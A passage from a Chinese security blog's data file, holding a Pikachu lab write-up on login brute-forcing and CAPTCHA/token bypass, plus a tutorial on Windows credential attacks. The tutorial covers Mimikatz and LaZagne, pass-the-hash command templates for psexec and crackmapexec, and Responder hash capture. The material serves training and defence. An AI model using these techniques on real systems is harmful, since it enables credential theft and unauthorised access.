alt></p>\n<p>接下来，将验证码设置为正确的值，然后发送数据包，发现验证码验证成功。然后再继续重放该正确验证码的数据包几次，发现即使由于用户名密码不正确，导致页面刷新了验证码，但是并不需要再次输入验证码。即服务器只验证了一次验证码，验证成功的验证码可以一直重复使用。</p>\n<p>我们只需要验证正确一次验证码，就可以一直使用该验证码，然后就可以进行爆破了。爆破的流程同上一节，不再赘述。</p>\n<p><strong>漏洞分析：</strong></p>\n<p>接下来，让我们来分析一下源码，看漏洞是如何产生的（只截取部分关键代码）：</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319101955.png\" alt></p>\n<p>通过源码分析，我们可以得知，我们提交的验证码会被与存储在服务器session中的验证码做验证，但是由于在验证完成后，没有及时的销毁session，导致存储在session中的验证码在session生存周期内可以一直被重复使用。</p>\n<p><strong>漏洞修复</strong>：</p>\n<p>在验证完成之后，销毁验证码session：<code>unset($_SESSION[&#39;vcode&#39;]);</code></p>\n<p>另，</p>\n<p>通过分析验证码生成的源码，还发现了一个问题，生成的验证码会被以明文方式作为Cookie返回给客户端。这会导致直接可以进行爆破，爆破方法参照下面0x03节的内容。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103538.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103611.png\" alt></p>\n<h3 id=\"0x02-客户端验证码绕过\"><a href=\"#0x02-客户端验证码绕过\" class=\"headerlink\" title=\"0x02 客户端验证码绕过\"></a>0x02 客户端验证码绕过</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个包含验证码的表单登录页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103858.png\" alt></p>\n<p>还是先确定验证码是由JS生成还是由服务器生成。</p>\n<p>继续在页面<code>F12</code>,然后定位找到元素，可以确定是由客户端JS的<code>createCode()</code>函数生成。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319104637.png\" alt></p>\n<p>输入用户名密码及验证码，点击Login并使用Burp抓包。将验证码删除并进行重放，发现没有影响。可以确定服务器并未对验证码进行验证。接下来直接进行爆破即可，爆破流程参考前面。</p>\n<p><strong>漏洞分析</strong></p>\n<p>前端JS生成验证码且前端JS进行验证码的校验，对使用Burp抓包爆破而言形同虚设。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319110240.png\" alt></p>\n<h3 id=\"0x03-Token防爆破\"><a href=\"#0x03-Token防爆破\" class=\"headerlink\" title=\"0x03 Token防爆破\"></a>0x03 Token防爆破</h3><p>首先，先给出结论，表单token的作用是防止重复提交和CSRF。但不要认为有防止重复提交在防爆破上就有作用。</p>\n<p>因为表单Token是作为一个隐藏的<code>&lt;input /&gt;</code>标签的值输出在返回给用户的页面的，是可以直接从页面读取获取的，所以是防不了爆破的。如果还有疑问，继续往下看使用Burp进行爆破。</p>\n<p>还是继续登录并抓包的操作，可以发现POST提交的数据中存在Token，第一次放行数据包，返回用户名密码不存在。接着再连续重放该数据包，发现只是刷新的页面，返回消息没有再报用户名密码不存在。因此可以猜测到，服务器对Token做了验证，由于Token不正确所以没有进行用户名密码验证的逻辑，所以仅刷新了页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319114454.png\" alt></p>\n<p>接下来使用Burp进行爆破，先将数据包发送到Intruder模块。</p>\n<p>将用户名、密码、Token作为变量，<code>Attack Type</code>使用<code>Pitch fork</code>模式。（注意，只能使用该模式）</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319115718.png\" alt></p>\n<p>转到<code>Options</code>按钮下，找到<code>Grep-Extract</code>，勾选<code>Extract the following items from response</code>，然后点击<code>ADD</code>。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319125134.png\" alt></p>\n<p>点击<code>ADD</code>后会弹出一个框，按下图步骤方式配置，配置完成点击<code>OK</code>。作用就是可以从响应消息（Response）中提取一段数据作为下一次请求信息（Request）的Payload。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319125941.png\" alt></p>\n<p>接着转到<code>Payloads</code>按钮下设置Payload</p>\n<p>选择<code>Payload set</code>为1，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击Load导入用户名字典文件。</p>\n<p>选择<code>Payload set</code>为2，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击Load导入密码字典文件。</p>\n<p>选择<code>Payload set</code>为3，<code>Payload Type</code>选择<code>Recursive grep</code>，然后输入第一个请求要使用的Payload(可以不设)。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319130503.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319130947.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319131320.png\" alt></p>\n<p>设置完成后，点击<code>Start attack</code>，发现报错。这是因为不能使用多线程爆破，因为每次爆破其中一个Payload需要从前一个响应消息中提取。因此再次转到<code>Options</code>按钮下，找到<code>Request Engine</code>，修改线程数为单线程。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319131802.png\" alt></p>\n<p>再次点击<code>Start attack</code>，进行爆破即可。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319132139.png\" alt></p>\n<p>点击<code>Length</code>按钮进行排序，发现一个长度与其他不一致的数据包，点击数据包查看，爆破成功。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319132951.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>查看源码发现服务器端在进行用户名密码验证的逻辑之前，先验证了token。印证了我们之前的猜想。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319133447.png\" alt></p>\n<p>但是使用Token进行防爆破的漏洞不在于是否对Token进行了验证，而在于Token会返回在页面中被读取。</p>\n<h2 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h2><blockquote>\n<p>防暴力破解应该理解成防止自动化脚本快速请求以达到破解的目的。</p>\n</blockquote>\n<p><strong>表单暴力破解防范</strong>：</p>\n<blockquote>\n<ol>\n<li>使用安全的验证码进行验证（滑动验证码…）。</li>\n<li>在某段单位时间内，用户登录失败达到一定次数时，锁定用户或限制短时间内不允许登录。</li>\n<li>对IP进行单位时间内登录请求数的限制。</li>\n<li>验证码应该以图片形式而不是以字符串形式出现在HTML或Cookie中。</li>\n</ol>\n</blockquote>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://www.cnblogs.com/KbCat/p/9317545.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/KbCat/p/9317545.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、前面的话\"><a href=\"#一、前面的话\" class=\"headerlink\" title=\"一、前面的话\"></a>一、前面的话</h2><h3 id=\"0x00-Whatever\"><a href=\"#0x00-Whatever\" class=\"headerlink\" title=\"0x00 Whatever\"></a>0x00 Whatever</h3><p>无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。</p>\n<p>看到靶场介绍里有一句话：</p>\n<blockquote>\n<p>“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。</p>\n</blockquote>\n<p>觉得很是这么个道理，因此在使用该靶场时，会包含如下方面：</p>\n<blockquote>\n<ul>\n<li>漏洞挖掘：找出漏洞或证明漏洞。</li>\n<li>漏洞分析：分析源代码。</li>\n<li>漏洞利用。</li>\n<li>漏洞修复。</li>\n</ul>\n</blockquote>","more":"<h3 id=\"0x01-靶机介绍\"><a href=\"#0x01-靶机介绍\" class=\"headerlink\" title=\"0x01 靶机介绍\"></a>0x01 靶机介绍</h3><p>Pikachu源码：<a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\" target=\"_blank\" rel=\"noopener\">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>\n<p>Pikachu是一个带有漏洞的Web应用系统，包含了常见的web安全漏洞。</p>\n<p>包含：</p>\n<blockquote>\n<ul>\n<li>Burt Force(暴力破解漏洞)</li>\n<li>XSS(跨站脚本漏洞)</li>\n<li>CSRF(跨站请求伪造)</li>\n<li>SQL-Inject(SQL注入漏洞)</li>\n<li>RCE(远程命令/代码执行)</li>\n<li>Files Inclusion(文件包含漏洞)</li>\n<li>Unsafe file downloads(不安全的文件下载)</li>\n<li>Unsafe file uploads(不安全的文件上传)</li>\n<li>Over Permisson(越权漏洞)</li>\n<li>../../../(目录遍历)</li>\n<li>I can see your ABC(敏感信息泄露)</li>\n<li>PHP反序列化漏洞</li>\n<li>XXE(XML External Entity attack)</li>\n<li>不安全的URL重定向</li>\n<li>SSRF(Server-Side Request Forgery)</li>\n<li>管理工具</li>\n<li>More…(找找看?..有彩蛋!)</li>\n</ul>\n</blockquote>\n<h2 id=\"二、暴力破解\"><a href=\"#二、暴力破解\" class=\"headerlink\" title=\"二、暴力破解\"></a>二、暴力破解</h2><h3 id=\"0x00-简单表单爆破\"><a href=\"#0x00-简单表单爆破\" class=\"headerlink\" title=\"0x00 简单表单爆破\"></a>0x00 简单表单爆破</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个登录表单页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319090517.png\" alt></p>\n<p>输入admin/admin作为用户名/密码，点击Login，并使用burp进行抓包拦截。</p>\n<p>在burp右键抓到的数据包，然后<code>Send to Intruder</code>。或者直接<code>Ctrl + I</code>发送到intuder爆破模块。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319090805.png\" alt></p>\n<p>转到<code>intruder</code>模块，在<code>Positions</code>按钮下，先点击右侧的<code>Clear $</code>清除变量，然后选中用户名和密码位置点击<code>ADD $</code>将用户名和密码位置作为变量。<code>Attack type</code>就使用<code>Cluster bomb</code>模式。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093205.png\" alt></p>\n<p>点击<code>Positions</code>按钮旁边的<code>Payloads</code>按钮进入设置Payload，由于我们设置了两个变量，所以需要设置两个Payload。</p>\n<p>选择<code>Payload set</code>为1，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击<code>Load</code>导入用户名字典文件。</p>\n<p>选择<code>Payload set</code>为2，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击<code>Load</code>导入密码字典文件。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093646.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093717.png\" alt></p>\n<p>设置好之后，点击右上角<code>Start Attack</code>。</p>\n<p>在爆破时，点击<code>Length</code>字段进行排序，可发现有不同大小的数据包，点击查看数据包发现爆破成功。密码：admin/123456</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093939.png\" alt></p>\n<h3 id=\"0x01-服务器端验证码绕过\"><a href=\"#0x01-服务器端验证码绕过\" class=\"headerlink\" title=\"0x01 服务器端验证码绕过\"></a>0x01 服务器端验证码绕过</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，还是一个登录表单页面，但是增加了验证码。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319094111.png\" alt></p>\n<p>接下来尝试绕过验证码。</p>\n<p>首先先确定，验证码是服务器生成的，还是客户端JS生成的。</p>\n<p>在网页上按下<code>F12</code>按钮，定位验证码图片，图片由<code>&lt;img&gt;</code>标签加载，可以确定验证码由服务器生成。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319104247.png\" alt></p>\n<p>确定了验证码是由服务器生成了之后，再确定服务器是否真的对验证码做了验证。</p>\n<p>输入用户名密码及验证码然后点击Login，并使用Burp进行抓包。</p>\n<p>右击抓到的数据包，选择<code>Send to Repeater</code>发送到重放模块。或者直接<code>Ctrl + R</code>。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319094958.png\" alt></p>\n<p>点击进入<code>Repeater</code>模块，将验证码修改为任意值后，点击<code>Go</code>按钮进行重放。发现返回验证码输入错误，证明服务器对验证码做了验证。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319095233.png\" alt></p>\n<p>接下来，将验证码设置为正确的值，然后发送数据包，发现验证码验证成功。然后再继续重放该正确验证码的数据包几次，发现即使由于用户名密码不正确，导致页面刷新了验证码，但是并不需要再次输入验证码。即服务器只验证了一次验证码，验证成功的验证码可以一直重复使用。</p>\n<p>我们只需要验证正确一次验证码，就可以一直使用该验证码，然后就可以进行爆破了。爆破的流程同上一节，不再赘述。</p>\n<p><strong>漏洞分析：</strong></p>\n<p>接下来，让我们来分析一下源码，看漏洞是如何产生的（只截取部分关键代码）：</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319101955.png\" alt></p>\n<p>通过源码分析，我们可以得知，我们提交的验证码会被与存储在服务器session中的验证码做验证，但是由于在验证完成后，没有及时的销毁session，导致存储在session中的验证码在session生存周期内可以一直被重复使用。</p>\n<p><strong>漏洞修复</strong>：</p>\n<p>在验证完成之后，销毁验证码session：<code>unset($_SESSION[&#39;vcode&#39;]);</code></p>\n<p>另，</p>\n<p>通过分析验证码生成的源码，还发现了一个问题，生成的验证码会被以明文方式作为Cookie返回给客户端。这会导致直接可以进行爆破，爆破方法参照下面0x03节的内容。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103538.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103611.png\" alt></p>\n<h3 id=\"0x02-客户端验证码绕过\"><a href=\"#0x02-客户端验证码绕过\" class=\"headerlink\" title=\"0x02 客户端验证码绕过\"></a>0x02 客户端验证码绕过</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个包含验证码的表单登录页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319103858.png\" alt></p>\n<p>还是先确定验证码是由JS生成还是由服务器生成。</p>\n<p>继续在页面<code>F12</code>,然后定位找到元素，可以确定是由客户端JS的<code>createCode()</code>函数生成。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319104637.png\" alt></p>\n<p>输入用户名密码及验证码，点击Login并使用Burp抓包。将验证码删除并进行重放，发现没有影响。可以确定服务器并未对验证码进行验证。接下来直接进行爆破即可，爆破流程参考前面。</p>\n<p><strong>漏洞分析</strong></p>\n<p>前端JS生成验证码且前端JS进行验证码的校验，对使用Burp抓包爆破而言形同虚设。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319110240.png\" alt></p>\n<h3 id=\"0x03-Token防爆破\"><a href=\"#0x03-Token防爆破\" class=\"headerlink\" title=\"0x03 Token防爆破\"></a>0x03 Token防爆破</h3><p>首先，先给出结论，表单token的作用是防止重复提交和CSRF。但不要认为有防止重复提交在防爆破上就有作用。</p>\n<p>因为表单Token是作为一个隐藏的<code>&lt;input /&gt;</code>标签的值输出在返回给用户的页面的，是可以直接从页面读取获取的，所以是防不了爆破的。如果还有疑问，继续往下看使用Burp进行爆破。</p>\n<p>还是继续登录并抓包的操作，可以发现POST提交的数据中存在Token，第一次放行数据包，返回用户名密码不存在。接着再连续重放该数据包，发现只是刷新的页面，返回消息没有再报用户名密码不存在。因此可以猜测到，服务器对Token做了验证，由于Token不正确所以没有进行用户名密码验证的逻辑，所以仅刷新了页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319114454.png\" alt></p>\n<p>接下来使用Burp进行爆破，先将数据包发送到Intruder模块。</p>\n<p>将用户名、密码、Token作为变量，<code>Attack Type</code>使用<code>Pitch fork</code>模式。（注意，只能使用该模式）</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319115718.png\" alt></p>\n<p>转到<code>Options</code>按钮下，找到<code>Grep-Extract</code>，勾选<code>Extract the following items from response</code>，然后点击<code>ADD</code>。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319125134.png\" alt></p>\n<p>点击<code>ADD</code>后会弹出一个框，按下图步骤方式配置，配置完成点击<code>OK</code>。作用就是可以从响应消息（Response）中提取一段数据作为下一次请求信息（Request）的Payload。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319125941.png\" alt></p>\n<p>接着转到<code>Payloads</code>按钮下设置Payload</p>\n<p>选择<code>Payload set</code>为1，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击Load导入用户名字典文件。</p>\n<p>选择<code>Payload set</code>为2，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击Load导入密码字典文件。</p>\n<p>选择<code>Payload set</code>为3，<code>Payload Type</code>选择<code>Recursive grep</code>，然后输入第一个请求要使用的Payload(可以不设)。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319130503.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319130947.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319131320.png\" alt></p>\n<p>设置完成后，点击<code>Start attack</code>，发现报错。这是因为不能使用多线程爆破，因为每次爆破其中一个Payload需要从前一个响应消息中提取。因此再次转到<code>Options</code>按钮下，找到<code>Request Engine</code>，修改线程数为单线程。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319131802.png\" alt></p>\n<p>再次点击<code>Start attack</code>，进行爆破即可。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319132139.png\" alt></p>\n<p>点击<code>Length</code>按钮进行排序，发现一个长度与其他不一致的数据包，点击数据包查看，爆破成功。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319132951.png\" alt></p>\n<p><strong>漏洞分析</strong></p>\n<p>查看源码发现服务器端在进行用户名密码验证的逻辑之前，先验证了token。印证了我们之前的猜想。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319133447.png\" alt></p>\n<p>但是使用Token进行防爆破的漏洞不在于是否对Token进行了验证，而在于Token会返回在页面中被读取。</p>\n<h2 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h2><blockquote>\n<p>防暴力破解应该理解成防止自动化脚本快速请求以达到破解的目的。</p>\n</blockquote>\n<p><strong>表单暴力破解防范</strong>：</p>\n<blockquote>\n<ol>\n<li>使用安全的验证码进行验证（滑动验证码…）。</li>\n<li>在某段单位时间内，用户登录失败达到一定次数时，锁定用户或限制短时间内不允许登录。</li>\n<li>对IP进行单位时间内登录请求数的限制。</li>\n<li>验证码应该以图片形式而不是以字符串形式出现在HTML或Cookie中。</li>\n</ol>\n</blockquote>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://www.cnblogs.com/KbCat/p/9317545.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/KbCat/p/9317545.html</a></p>"},{"title":"Windows认证攻击","date":"2019-04-06T02:25:26.000Z","_content":"\n### 0x00 窃取Windows凭证\n\n**Mimikatz**\n\n我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到`lsass.exe`进程中，然后`lsass.exe`会将明文密码计算为`NTLM Hash`，在用户登录期间一直保存在内存中。\n\nMimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从`lsass.exe`进程里获取`Windows`处于active状态账号的明文密码或`NT Hash`。在Windows >= 8.1情况下，无法提取明文密码，但是可以提取到`NT Hash`。\n\n[Mimikatz下载链接。](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-delegation)\n\n<!-- more -->\n\n工具演示：\n\n![](windows认证攻击\\QQ截图20190407101243.png)\n\n**LaZagne**\n\n既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有：\n\n![](windows认证攻击\\softwares.png)\n\n[LaZagne下载地址。](https://github.com/AlessandroZ/LaZagne)\n\n工具演示：\n\n![](windows认证攻击\\QQ截图20190407105139.png)\n\n### 0x01 Pass The Hash\n\n在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的`NT Hash`加密`Server Challenge`得到Response（验证过程中第三个数据包），因此，我们只要知道用户的`NT Hash`，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转[这里](https://sakuxa.com/2019/04/03/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/)学习NTLM网络认证。\n\n常用实现Pass The Hash攻击的工具：\n\n- Smbmap\n- Smbexec\n- Metasploit\n- CrackMapExec\n\n接下来我们使用最后两个工具来模拟进行哈希传递攻击。\n\n**NTLM Hash**\n\n在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：`LM Hash:NT Hash`，直到Windows Vista和Window Server 2008之后，就只存储`NT Hash`了。为此，有些工具在给其提供Hash值参数时，需要使用`LM Hash:NT Hash`这样的格式，即使没有`LM Hash`，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出`NT Hash`即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。\n\n**Meatasploit Psexec**\n\n> Meatasploit中的`psexec`模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。\n\n攻击演示：\n\n- `use exploit/windows/smb/psexec`\n- 设置smbpass的格式是`LM:NTLM`，但在w2k8中，LM已禁用，所以`LM`处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。\n\n![](windows认证攻击\\QQ截图20190406101732.png)\n\n**CrackMapExec**\n\n> 使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x \"cmd\"）。\n\nKali安装CrackMapExec：\n\n- `apt-get install crackmapexec`\n\n使用格式：\n\n```\ncrackmapexec  smb  <IP>  -u <Username>  -H <NT hash>  -x \"cmd\"\n```\n\n攻击演示：\n\n使用Hash值进行攻击，让目标计算机执行`msg adminitrator hacked`命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。\n\n![](windows认证攻击\\QQ截图20190405101817.png)\n\n### 0x02 毒化与中间人攻击\n\n在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下：\n\n> 1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\\Windows\\System32\\drivers\\etc\\hosts）\n>\n> 2、检查本地的dns缓存。（ipconfig /displaydns）\n>\n> 3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。\n>\n> 4、最后,如果DNS服务器也解析失败,它就会被交给`LLMNR`和`NetBios-NS`协议去处理解析。\n\n**LLMNR**\n\n> `LLMNR`，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。\n\n`LLMNR`与`NBNS`对比：\n\n> 1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）；\n>\n> 2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR；\n>\n> 3、LLMNR还支持IPv6，而NetBIOS不支持。\n\n**Responder**\n\nResponder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。[工具Github地址。](https://github.com/SpiderLabs/Responder)\n\nResponder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。\n\n当我们启动responder时，它会侦听网络中所有的`LLMNR`、`NBNS`名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取`NetNTLM Hash`。\n\n这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用`LLMNR`、`NBNS`协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到`NTLMv2 Hash`。\n\n工具使用\n\n工具安装：`apt-get isntall responder`\n\nResponder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的`logs/`文件夹下。\n\n- `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`\n\n参数：\n\n```\n简单启用：responder -I eth0 -v\n\nOptions:\n  --version          工具版本。\n  -h, --help         帮助信息。\n  -A, --analyze      分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。\n  \n  -I eth0, --interface=eth0      指定网络接口，可以指定'ALL'来使用所有接口。\n  -i 10.0.0.21, --ip=10.0.0.21   Local IP to use (only for OSX)\n  \n  -e 10.0.0.22, --externalip=10.0.0.22   以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。\n  \n  -b, --basic           Return a Basic HTTP authentication. Default: NTLM\n  -r, --wredir          Enable answers for netbios wredir suffix queries.\n                        Answering to wredir will likely break stuff on the\n                        network. Default: False\n                        \n  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.\n                        Answering to domain suffixes will likely break stuff\n                        on the network. Default: False\n                        \n  -f, --fingerprint     This option allows you to fingerprint a host that\n                        issued an NBT-NS or LLMNR query.\n                        \n  -w, --wpad            Start the WPAD rogue proxy server. Default value is\n                        False\n                        \n  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY\n                        Upstream HTTP proxy used by the rogue WPAD Proxy for\n                        outgoing requests (format: host:port)\n                        \n  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file\n                        retrieval. This may cause a login prompt. Default:\n                        False\n                        \n  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)\n                        authentication for the proxy. WPAD doesn't need to be\n                        ON. This option is highly effective when combined with\n                        -r. Default: False\n                        \n  --lm                  Force LM hashing downgrade for Windows XP/2003 and\n                        earlier. Default: False\n                        \n  -v, --verbose         Increase verbosity.\n\n```\n\n工具配置文件路径：`/usr/share/responder/Responder.conf`\n\n修改配置文件只针对特定主机响应：\n\n![](windows认证攻击\\QQ截图20190408140244.png)\n\n工具演示：\n\n在网络中启用工具。\n\n![](windows认证攻击\\QQ截图20190408141317.png)\n\n抓取到Hash：\n\n![](windows认证攻击\\QQ截图20190408141627.png)\n\n使用Hashcat破解：\n\n**参考链接：**\n\nhttps://www.secpulse.com/archives/65503.html\n\nhttp://baijiahao.baidu.com/s?id=1599333064699003609&wfr=spider&for=pc\n\nhttps://www.jianshu.com/p/1b545a8b8b1e\n\nhttps://blog.csdn.net/vevenlcf/article/details/80887753","source":"_posts/windows认证攻击.md","raw":"---\ntitle: Windows认证攻击\ndate: 2019-04-06 10:25:26\ntags:\n\t- Pass The Hash\ncategories: 内网渗透\n---\n\n### 0x00 窃取Windows凭证\n\n**Mimikatz**\n\n我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到`lsass.exe`进程中，然后`lsass.exe`会将明文密码计算为`NTLM Hash`，在用户登录期间一直保存在内存中。\n\nMimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从`lsass.exe`进程里获取`Windows`处于active状态账号的明文密码或`NT Hash`。在Windows >= 8.1情况下，无法提取明文密码，但是可以提取到`NT Hash`。\n\n[Mimikatz下载链接。](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-delegation)\n\n<!-- more -->\n\n工具演示：\n\n![](windows认证攻击\\QQ截图20190407101243.png)\n\n**LaZagne**\n\n既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有：\n\n![](windows认证攻击\\softwares.png)\n\n[LaZagne下载地址。](https://github.com/AlessandroZ/LaZagne)\n\n工具演示：\n\n![](windows认证攻击\\QQ截图20190407105139.png)\n\n### 0x01 Pass The Hash\n\n在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的`NT Hash`加密`Server Challenge`得到Response（验证过程中第三个数据包），因此，我们只要知道用户的`NT Hash`，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转[这里](https://sakuxa.com/2019/04/03/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/)学习NTLM网络认证。\n\n常用实现Pass The Hash攻击的工具：\n\n- Smbmap\n- Smbexec\n- Metasploit\n- CrackMapExec\n\n接下来我们使用最后两个工具来模拟进行哈希传递攻击。\n\n**NTLM 